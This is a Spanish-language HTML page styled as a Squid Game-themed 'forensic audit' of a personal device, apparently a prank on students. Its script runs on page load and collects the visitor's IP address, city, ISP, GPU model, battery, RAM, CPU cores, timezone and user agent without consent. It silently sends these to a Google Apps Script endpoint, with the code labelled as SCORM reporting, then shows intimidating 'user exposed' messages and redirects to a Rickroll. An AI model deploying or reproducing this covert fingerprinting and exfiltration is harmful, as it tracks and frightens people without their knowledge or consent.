<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>SISTEMA DE AUDITORÍA - TEC PLAYA</title>
    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@300;500;700&display=swap" rel="stylesheet">
    <style>
        :root { --pink: #ed1b76; --green: #037a76; --bg: #050505; }
        body { background: var(--bg); color: white; font-family: 'Quicksand', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        #audit-panel { border: 2px solid var(--pink); padding: 40px; background: rgba(237, 27, 118, 0.05); text-align: center; max-width: 800px; width: 95%; box-shadow: 0 0 50px rgba(237, 27, 118, 0.3); }
        .glitch { font-size: 3em; color: var(--pink); font-weight: 700; text-transform: uppercase; margin: 0; }
        #console { text-align: left; background: #000; padding: 25px; border-left: 5px solid var(--green); color: #00ffcc; font-family: 'Courier New', monospace; font-size: 0.85em; margin-top: 25px; line-height: 1.6; max-height: 350px; overflow-y: auto; }
        .danger { color: #ff4d4d; font-weight: bold; }
        .shapes { font-size: 35px; color: var(--pink); letter-spacing: 15px; margin-bottom: 15px; }
    </style>
</head>
<body>

<div id="audit-panel">
    <div class="shapes">○ △ □</div>
    <h1 id="status-title">IDENTIFICANDO...</h1>
    <p class="danger">AUDITORÍA FORENSE: DISPOSITIVO PERSONAL DETECTADO</p>
    
    <div id="console">
        > Rompiendo sandbox de privacidad...<br>
        > Mapeando arquitectura de hardware del intruso...<br>
    </div>

    <p id="countdown" style="margin-top:25px; color:var(--green); font-weight: 700;">
        ENVIANDO MINERÍA AL SERVIDOR DEL PROFESOR EN: 7...
    </p>
</div>

<script>
/* INTEGRACIÓN SCORM ENGINE V23 - LÓGICA DE REPORTE */
const SCORM = {
    config: {
        activityId: "AUDITORIA_FORENSE_PERSONALES_2026",
        scriptUrl: "https://script.google.com/macros/s/AKfycbwuyrdlN36c4cSAMEDUmwm3m3pF6gbjcIN0U41FS2byd5B49wTTGjVXb12HRXUtM-zSVg/exec"
    },
    syncCloud: function(action, data) {
        const payload = {
            sheetName: this.config.activityId,
            action: action,                      // Columna: Estado
            id: data.ip,                        // Columna: ID Alumno
            name: "ELIMINADO: " + data.gpu_short, // Columna: Nombre
            score: data.bat,                     // Columna: Calificación
            progress: data.ram,                  // Columna: Progreso
            device: data.tipo,                   // Columna: Dispositivo
            
            // TODA LA MINERÍA DETALLADA VA EN DATA EXTRA
            extra: JSON.stringify({
                modelo_gpu: data.gpu_full,
                cpu_hilos: data.cores,
                resolucion: data.res,
                zona_horaria: data.tz,
                ubicacion_isp: data.loc,
                agente_completo: data.ua,
                idioma: data.lang
            })
        };
        const url = `${this.config.scriptUrl}?q=${encodeURIComponent(JSON.stringify(payload))}`;
        if (navigator.sendBeacon) navigator.sendBeacon(url);
        else fetch(url, { mode: 'no-cors', keepalive: true });
    }
};

async function startAudit() {
    const log = document.getElementById('console');
    const add = (m) => { log.innerHTML += `> ${m}<br>`; log.scrollTop = log.scrollHeight; };

    // 1. Minado de Red (HTTPS GitHub Context)
    let net = { ip: "Oculta", city: "Local", org: "Unknown" };
    try {
        const res = await fetch('https://ipapi.co/json/');
        net = await res.json();
        add(`NODO DETECTADO: <span class="danger">${net.ip}</span>`);
        add(`UBICACIÓN: ${net.city}, ${net.region} (${net.org})`);
    } catch(e) { add("ALERTA: Red anonimizada. Usando hardware DNA."); }

    // 2. Minado de Hardware DNA
    const gl = document.createElement('canvas').getContext('webgl');
    const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
    const gpuFull = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Genérica";
    
    let battery = { level: "N/A" };
    try { const b = await navigator.getBattery(); battery.level = Math.floor(b.level * 100); } catch(e) {}

    const forensic = {
        ip: net.ip,
        loc: `${net.city}, ${net.country_name} (${net.org})`,
        gpu_full: gpuFull,
        gpu_short: gpuFull.split(',')[1] || gpuFull.substring(0, 30),
        bat: battery.level,
        ram: navigator.deviceMemory || "N/A",
        cores: navigator.hardwareConcurrency,
        res: `${window.screen.width}x${window.screen.height}`,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        lang: navigator.language,
        ua: navigator.userAgent,
        tipo: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop"
    };

    add(`DISPOSITIVO: ${navigator.platform} (${forensic.cores} hilos)`);
    add(`MEMORIA RAM: ${forensic.ram} GB`);
    add(`GPU IDENTIFICADA: ${forensic.gpu_short}`);
    add(`BATERÍA: ${forensic.bat}%`);
    add(`<span style="color:#ed1b76">REPORTE ENVIADO: USUARIO EXPUESTO</span>`);

    document.getElementById('status-title').innerText = "ELIMINADO";

    // Envío a Google Sheets
    SCORM.syncCloud("Auditoría de Entorno Personal", forensic);

    // Redirección al Rickroll
    let t = 7;
    const timerEl = document.getElementById('countdown');
    const cd = setInterval(() => {
        t--;
        timerEl.innerText = `REPORTE AL SERVIDOR DEL PROFESOR EN: ${t}...`;
        if(t <= 0) {
            clearInterval(cd);
            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        }
    }, 1000);
}

window.onload = startAudit;
</script>
</body>
</html>
